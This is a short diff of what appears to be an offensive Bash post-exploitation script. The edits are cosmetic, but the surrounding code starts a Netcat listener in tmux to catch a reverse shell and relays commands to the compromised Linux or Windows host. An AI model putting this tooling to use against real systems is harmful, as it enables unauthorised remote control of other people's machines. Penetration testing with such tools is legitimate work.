@@ -2047,8 +2047,7 @@ post_exploitation() {
     # Create a new tmux session for the Netcat listener
     tmux new-session -d -s nc_listener "nc -lvnp $listen_port"
 
-    echo -e "${GREEN}[+] Ejecute el comando para obtener la reverse shell... ${NC}"
-    echo
+    echo -e "${BLUE}Ejecute el comando para obtener la reverse shell... ${NC}"
     echo -e "${YELLOW}[+] Select a post-exploitation option: ${NC}"
     read -e -p "Is the shell Linux or Windows? (l/w): " shell_type
     while true; do
@@ -2147,7 +2146,7 @@ post_exploitation() {
 
         # Display the output from the reverse shell
         echo -e "${VIOLET}\n\n\n=========================================================================="
-        echo -e "================== ${YELLOW}Used module: ($post_option) - OS: ($post_option)${VIOLET}=================="
+        echo -e "============================ ${YELLOW}Used module: ($post_option) ${VIOLET}============================"
         echo -e "==========================================================================${NC}"
         echo
         tmux capture-pane -pt nc_listener -S -1000
@@ -2163,6 +2162,7 @@ post_exploitation() {
 send_command() {
     local cmd="$1"
     local delay="$2"
+    clear
     tmux send-keys -t nc_listener "$cmd" C-m
     echo -e "${YELLOW}[+] Waiting for $delay seconds...${NC}"
 
